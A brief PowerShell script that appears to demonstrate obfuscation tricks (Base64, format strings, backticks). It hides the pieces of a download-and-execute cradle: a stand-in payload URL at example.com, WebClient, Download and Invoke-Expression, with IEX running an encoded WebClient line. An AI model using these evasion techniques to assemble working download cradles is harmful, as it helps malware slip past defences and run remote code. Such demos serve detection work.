# Demo: PowerShell obfuscation with encoding, format strings, backticks
$a = [System.Convert]::FromBase64String('aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=')
$url = [System.Text.Encoding]::UTF8.GetString($a)
$b = "{2}{0}{1}" -f 'wnl','oad','Do'
$c = "Ne`t.We`bCl`ie`nt"
$d = "I`nv`ok`e-Ex`pre`ss`ion"
$encoded = 'JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA'
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
IEX $decoded
